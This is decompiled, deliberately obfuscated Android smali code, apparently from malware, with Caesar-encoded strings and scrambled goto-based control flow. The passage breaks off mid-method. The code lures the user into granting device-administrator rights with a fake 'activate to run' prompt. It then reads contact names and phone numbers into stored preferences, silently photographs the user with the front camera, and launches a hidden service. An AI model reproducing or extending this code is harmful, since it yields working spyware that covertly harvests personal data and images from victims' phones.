.class public Lcom/EDzgPz/KwIOuS/kdTxzV;
.super Landroid/app/Activity;


# static fields
.field static final ACTIVATION_REQUEST:I = 0x2f

.field static final TAG:Ljava/lang/String; = "EfwjdfQpmjdzEfnpBdujwjuz"


# instance fields
.field private camera:I

.field private cameras:Landroid/hardware/Camera;

.field private demoDeviceAdmin:Landroid/content/ComponentName;

.field private devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field private face:I

.field private pict:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-void

    nop

    goto :goto_2

    :goto_1
    nop

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private openFrontFacingCameraGingerbread()Landroid/hardware/Camera;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->xopenFrontFacingCameraGingerbread()Landroid/hardware/Camera;

    move-result-object v0

    return-object v0
.end method

.method private xcolotit()V
    .locals 15

    .prologue
    nop

    goto/16 :goto_56

    :goto_0
    nop

    goto/16 :goto_1b

    nop

    goto/16 :goto_57

    :goto_1
    nop

    iput v11, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->face:I

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-interface {v0, v8, v12}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v8, "dbnfsb"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-virtual {p0, v8, v10}, Lcom/EDzgPz/KwIOuS/kdTxzV;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    nop

    goto :goto_5

    :cond_0
    :goto_7
    nop

    const-string v8, "dpdpo"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_6

    :goto_8
    nop

    goto/16 :goto_25

    nop

    goto :goto_7

    :cond_1
    :goto_9
    nop

    add-int/lit8 v1, v1, 0x1

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-virtual {v2, v8, v9}, Landroid/hardware/Camera$Parameters;->setPictureSize(II)V

    nop

    goto :goto_9

    :goto_b
    nop

    iget v9, v3, Landroid/hardware/Camera$Size;->height:I

    nop

    goto :goto_a

    :goto_c
    nop

    iget v8, v3, Landroid/hardware/Camera$Size;->width:I

    nop

    goto :goto_b

    :goto_d
    nop

    invoke-virtual {v2, v8, v9}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    nop

    goto :goto_c

    :goto_e
    nop

    iget v9, v3, Landroid/hardware/Camera$Size;->height:I

    nop

    goto :goto_d

    :goto_f
    nop

    iget v8, v3, Landroid/hardware/Camera$Size;->width:I

    nop

    goto :goto_e

    :goto_10
    nop

    if-ne v8, v9, :cond_1

    nop

    goto :goto_f

    :goto_11
    nop

    const/16 v9, 0x280

    nop

    goto :goto_10

    :goto_12
    nop

    iget v8, v3, Landroid/hardware/Camera$Size;->width:I

    nop

    goto :goto_11

    :goto_13
    nop

    check-cast v3, Landroid/hardware/Camera$Size;

    nop

    goto :goto_12

    :cond_2
    :goto_14
    nop

    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    nop

    goto :goto_13

    :goto_15
    nop

    goto/16 :goto_3a

    nop

    goto :goto_14

    :cond_3
    :goto_16
    nop

    iput v12, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->face:I

    nop

    goto :goto_15

    :goto_17
    nop

    goto/16 :goto_49

    nop

    goto :goto_16

    :goto_18
    nop

    invoke-virtual {p0, v8}, Lcom/EDzgPz/KwIOuS/kdTxzV;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    nop

    goto :goto_17

    :goto_19
    nop

    invoke-direct {v8, p0, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_18

    :goto_1a
    nop

    const-class v9, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_19

    :cond_4
    :goto_1b
    nop

    new-instance v8, Landroid/content/Intent;

    nop

    goto :goto_1a

    :goto_1c
    nop

    iput v12, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->face:I

    nop

    goto :goto_1b

    :goto_1d
    nop

    invoke-virtual {v8, v14, v14, v9}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    nop

    goto :goto_1c

    :goto_1e
    nop

    invoke-direct {v9, v10}, Lcom/EDzgPz/KwIOuS/JhfupU;-><init>(Landroid/content/Context;)V

    nop

    goto :goto_1d

    :goto_1f
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    nop

    goto :goto_1e

    :goto_20
    nop

    new-instance v9, Lcom/EDzgPz/KwIOuS/JhfupU;

    nop

    goto :goto_1f

    :goto_21
    nop

    iget-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->cameras:Landroid/hardware/Camera;

    nop

    goto :goto_20

    :goto_22
    nop

    invoke-virtual {v8, v2}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    nop

    goto :goto_21

    :goto_23
    nop

    iget-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->cameras:Landroid/hardware/Camera;

    nop

    goto :goto_22

    :goto_24
    nop

    if-lt v1, v8, :cond_2

    nop

    goto :goto_23

    :goto_25
    nop

    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v8

    nop

    goto :goto_24

    :goto_26
    nop

    const/4 v1, 0x0

    nop

    goto :goto_25

    :goto_27
    nop

    const/4 v3, 0x0

    nop

    goto :goto_26

    :goto_28
    nop

    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedPictureSizes()Ljava/util/List;

    move-result-object v6

    nop

    goto :goto_27

    :goto_29
    nop

    invoke-virtual {v2, v8, v9}, Landroid/hardware/Camera$Parameters;->set(Ljava/lang/String;Ljava/lang/String;)V

    nop

    goto :goto_28

    :goto_2a
    nop

    const-string v9, "qpsusbju"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_29

    :goto_2b
    nop

    const-string v8, "psjfoubujpo"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_2a

    :goto_2c
    nop

    invoke-virtual {v2, v8, v13}, Landroid/hardware/Camera$Parameters;->set(Ljava/lang/String;I)V

    nop

    goto :goto_2b

    :goto_2d
    nop

    const-string v8, "spubujpo"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_2c

    :goto_2e
    nop

    invoke-virtual {v8}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    nop

    goto :goto_2d

    :goto_2f
    nop

    iget-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->cameras:Landroid/hardware/Camera;

    nop

    goto :goto_2e

    :goto_30
    nop

    invoke-virtual {v8, v13}, Landroid/hardware/Camera;->setDisplayOrientation(I)V

    nop

    goto :goto_2f

    :goto_31
    nop

    iget-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->cameras:Landroid/hardware/Camera;

    nop

    goto :goto_30

    :goto_32
    nop

    if-eqz v8, :cond_0

    nop

    goto :goto_31

    :goto_33
    nop

    iget-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->cameras:Landroid/hardware/Camera;

    nop

    goto :goto_32

    :goto_34
    nop

    iput-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->cameras:Landroid/hardware/Camera;

    nop

    goto :goto_33

    :goto_35
    nop

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->openFrontFacingCameraGingerbread()Landroid/hardware/Camera;

    move-result-object v8

    nop

    goto :goto_34

    :goto_36
    nop

    if-nez v8, :cond_4

    nop

    goto :goto_35

    :cond_5
    :goto_37
    nop

    iget v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->face:I

    nop

    goto :goto_36

    :goto_38
    nop

    iput v11, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->face:I

    nop

    goto :goto_37

    :goto_39
    nop

    if-ne v8, v12, :cond_5

    nop

    goto :goto_38

    :cond_6
    :goto_3a
    nop

    iget v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->camera:I

    nop

    goto :goto_39

    :goto_3b
    nop

    iput v11, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->face:I

    nop

    goto :goto_3a

    :goto_3c
    nop

    if-eqz v8, :cond_3

    nop

    goto :goto_3b

    :goto_3d
    nop

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    nop

    goto :goto_3c

    :goto_3e
    nop

    const-string v9, "gbdfovmm"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_3d

    :goto_3f
    nop

    iget-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->pict:Ljava/lang/String;

    nop

    goto :goto_3e

    :goto_40
    nop

    iput-object v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->pict:Ljava/lang/String;

    nop

    goto :goto_3f

    :goto_41
    nop

    invoke-interface {v4, v8, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_40

    :goto_42
    nop

    const-string v9, "gbdfovmm"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_41

    :goto_43
    nop

    const-string v8, "gbdf"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_42

    :goto_44
    nop

    if-ne v8, v11, :cond_6

    nop

    goto :goto_43

    :goto_45
    nop

    iget v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->camera:I

    nop

    goto :goto_44

    :goto_46
    nop

    iput v8, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->camera:I

    nop

    goto :goto_45

    :goto_47
    nop

    invoke-interface {v4, v8, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v8

    nop

    goto :goto_46

    :cond_7
    :goto_48
    nop

    const-string v8, "dbnfsb"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_47

    :goto_49
    nop

    return-void

    nop

    goto :goto_48

    :goto_4a
    nop

    invoke-static {v8}, Landroid/os/Process;->killProcess(I)V

    nop

    goto :goto_49

    :goto_4b
    nop

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v8

    nop

    goto :goto_4a

    :goto_4c
    nop

    if-ne v7, v8, :cond_7

    nop

    goto :goto_4b

    :goto_4d
    nop

    const/16 v8, 0x4d

    nop

    goto :goto_4c

    :goto_4e
    nop

    invoke-interface {v4, v8, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v7

    nop

    goto :goto_4d

    :goto_4f
    nop

    const-string v8, "tubuvt"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_4e

    :goto_50
    nop

    invoke-virtual {p0, v8, v10}, Lcom/EDzgPz/KwIOuS/kdTxzV;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    nop

    goto :goto_4f

    :goto_51
    nop

    const-string v8, "dpdpo"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_50

    :goto_52
    nop

    const/4 v10, 0x0

    nop

    goto :goto_51

    :goto_53
    nop

    const/4 v11, 0x1

    nop

    goto :goto_52

    :goto_54
    nop

    const/4 v12, 0x2

    nop

    goto :goto_53

    :goto_55
    nop

    const/16 v13, 0x5a

    nop

    goto :goto_54

    :goto_56
    nop

    const/4 v14, 0x0

    nop

    goto :goto_55

    :goto_57
    nop

    nop
.end method

.method private xebat()V
    .locals 7

    .prologue
    nop

    goto/16 :goto_b

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_c

    :goto_1
    nop

    invoke-virtual {p0, v0, v1}, Lcom/EDzgPz/KwIOuS/kdTxzV;->startActivityForResult(Landroid/content/Intent;I)V

    nop

    goto :goto_0

    :goto_2
    nop

    const/16 v1, 0x2f

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v3, 0x2

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v3

    aput-object v1, v5, v3

    const/4 v3, 0x1

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v3

    aput-object v2, v5, v3

    const-string v3, "putExtra"

    const-class v6, Landroid/content/Intent;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, v0, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v2, "Up!svo!uif!bqqmjdbujpo!.!bdujwbuf"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_3

    :goto_5
    nop

    const-string v1, "boespje/bqq/fyusb/BEE`FYQMBOBUJPO"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v3, 0x2

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v3

    aput-object v1, v5, v3

    const/4 v3, 0x1

    const-class v6, Landroid/os/Parcelable;

    aput-object v6, v4, v3

    aput-object v2, v5, v3

    const-string v3, "putExtra"

    const-class v6, Landroid/content/Intent;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, v0, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_5

    :goto_7
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/kdTxzV;->demoDeviceAdmin:Landroid/content/ComponentName;

    nop

    goto :goto_6

    :goto_8
    nop

    const-string v1, "boespje/bqq/fyusb/EFWJDF`BENJO"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_8

    :goto_a
    nop

    const-string v1, "boespje/bqq/bdujpo/BEE`EFWJDF`BENJO"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_9

    :goto_b
    nop

    new-instance v0, Landroid/content/Intent;

    nop

    goto :goto_a

    :goto_c
    nop

    nop
.end method

.method private xonActivityResult(IILandroid/content/Intent;)V
    .locals 6
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    nop

    goto/16 :goto_f

    nop

    :goto_0
    :pswitch_data_0
    .packed-switch 0x2f
        :pswitch_0
    .end packed-switch

    nop

    goto/16 :goto_10

    :goto_1
    nop

    goto/16 :goto_d

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->ebat()V

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v2, 0x2

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v0, v4, v2

    const/4 v2, 0x1

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "i"

    const-class v5, Landroid/util/Log;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v1, "Benjojtusbujpo!fobcmf!GBJMFE\""

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_3

    :cond_0
    :goto_5
    nop

    const-string v0, "EfwjdfQpmjdzEfnpBdujwjuz"

    invoke-static/range {v0 .. v0}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_4

    :goto_6
    nop

    goto :goto_d

    nop

    goto :goto_5

    :goto_7
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->colotit()V

    nop

    goto :goto_6

    :goto_8
    nop

    const/4 v2, 0x2

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v0, v4, v2

    const/4 v2, 0x1

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "i"

    const-class v5, Landroid/util/Log;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    nop

    goto :goto_7

    :goto_9
    nop

    const-string v1, "Benjojtusbujpo!fobcmfe\""

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_8

    :goto_a
    nop

    const-string v0, "EfwjdfQpmjdzEfnpBdujwjuz"

    invoke-static/range {v0 .. v0}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_9

    :goto_b
    nop

    if-ne p2, v0, :cond_0

    nop

    goto :goto_a

    :goto_c
    :pswitch_0
    nop

    const/4 v0, -0x1

    nop

    goto :goto_b

    :goto_d
    nop

    return-void

    nop

    goto :goto_c

    :goto_e
    nop

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    nop

    goto :goto_d

    :goto_f
    nop

    packed-switch p1, :pswitch_data_0

    nop

    goto :goto_e

    :goto_10
    nop

    nop
.end method

.method private xonCreate(Landroid/os/Bundle;)V
    .locals 18
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    nop

    goto/16 :goto_57

    :goto_0
    nop

    goto/16 :goto_17

    nop

    goto/16 :goto_58

    :cond_0
    :goto_1
    nop

    invoke-virtual/range {p0 .. p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->ebat()V

    nop

    goto :goto_0

    :goto_2
    nop

    goto/16 :goto_34

    nop

    goto :goto_1

    :goto_3
    nop

    if-le v0, v1, :cond_2

    nop

    goto :goto_2

    :goto_4
    nop

    move/from16 v0, v16

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v1, 0x5

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    nop

    goto :goto_5

    :goto_7
    nop

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    nop

    goto :goto_6

    :goto_8
    nop

    const-string v2, "!=cs!0?"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    nop

    goto :goto_9

    :goto_b
    nop

    const-string v2, "!"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_a

    :goto_c
    nop

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    nop

    goto :goto_b

    :goto_d
    nop

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_c

    :goto_e
    nop

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_d

    :goto_f
    nop

    new-instance v1, Ljava/lang/StringBuilder;

    nop

    goto :goto_e

    :goto_10
    nop

    add-int/lit8 v16, v16, 0x1

    nop

    goto :goto_f

    :goto_11
    nop

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_10

    :goto_12
    nop

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    nop

    goto :goto_11

    :goto_13
    nop

    const-string v1, "ebub2"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_12

    :goto_14
    nop

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    nop

    goto :goto_13

    :goto_15
    nop

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    nop

    goto :goto_14

    :cond_1
    :goto_16
    nop

    const-string v1, "ejtqmbz`obnf"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_15

    :goto_17
    nop

    return-void

    nop

    goto :goto_16

    :goto_18
    nop

    invoke-virtual/range {p0 .. p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->colotit()V

    nop

    goto :goto_17

    :goto_19
    nop

    if-eqz v1, :cond_0

    nop

    goto :goto_18

    :goto_1a
    nop

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    nop

    goto :goto_19

    :goto_1b
    nop

    iget-object v2, v0, Lcom/EDzgPz/KwIOuS/kdTxzV;->demoDeviceAdmin:Landroid/content/ComponentName;

    nop

    goto :goto_1a

    :goto_1c
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1b

    :goto_1d
    nop

    iget-object v1, v0, Lcom/EDzgPz/KwIOuS/kdTxzV;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    nop

    goto :goto_1c

    :goto_1e
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1d

    :goto_1f
    nop

    iput-object v1, v0, Lcom/EDzgPz/KwIOuS/kdTxzV;->demoDeviceAdmin:Landroid/content/ComponentName;

    nop

    goto :goto_1e

    :goto_20
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1f

    :goto_21
    nop

    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_20

    :goto_22
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_21

    :goto_23
    nop

    const-class v2, Lcom/EDzgPz/KwIOuS/myltAJ;

    nop

    goto :goto_22

    :goto_24
    nop

    new-instance v1, Landroid/content/ComponentName;

    nop

    goto :goto_23

    :goto_25
    nop

    iput-object v1, v0, Lcom/EDzgPz/KwIOuS/kdTxzV;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    nop

    goto :goto_24

    :goto_26
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_25

    :goto_27
    nop

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    nop

    goto :goto_26

    :goto_28
    nop

    invoke-virtual {v0, v1}, Lcom/EDzgPz/KwIOuS/kdTxzV;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    nop

    goto :goto_27

    :goto_29
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_28

    :goto_2a
    nop

    const-string v1, "efwjdf`qpmjdz"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_29

    :goto_2b
    nop

    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_2a

    :goto_2c
    nop

    invoke-interface {v12, v1, v13}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_2b

    :goto_2d
    nop

    const-string v1, "mjtuqipoft"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_2c

    :goto_2e
    nop

    invoke-interface {v12, v1, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_2d

    :goto_2f
    nop

    const-string v1, "dpvouqipoft"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_2e

    :goto_30
    nop

    invoke-interface {v15}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    nop

    goto :goto_2f

    :goto_31
    nop

    invoke-virtual {v0, v1, v2}, Lcom/EDzgPz/KwIOuS/kdTxzV;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    nop

    goto :goto_30

    :goto_32
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_31

    :goto_33
    nop

    const/4 v2, 0x0

    nop

    goto :goto_32

    :goto_34
    nop

    const-string v1, "dpdpo"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_33

    :goto_35
    nop

    if-nez v1, :cond_1

    nop

    goto :goto_34

    :cond_2
    :goto_36
    nop

    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    nop

    goto :goto_35

    :goto_37
    nop

    const-string v13, ""

    invoke-static/range {v13 .. v13}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    nop

    goto :goto_36

    :goto_38
    nop

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    nop

    goto :goto_37

    :goto_39
    nop

    const/4 v6, 0x0

    nop

    goto :goto_38

    :goto_3a
    nop

    const/4 v5, 0x0

    nop

    goto :goto_39

    :goto_3b
    nop

    const/4 v4, 0x0

    nop

    goto :goto_3a

    :goto_3c
    nop

    const/4 v3, 0x0

    nop

    goto :goto_3b

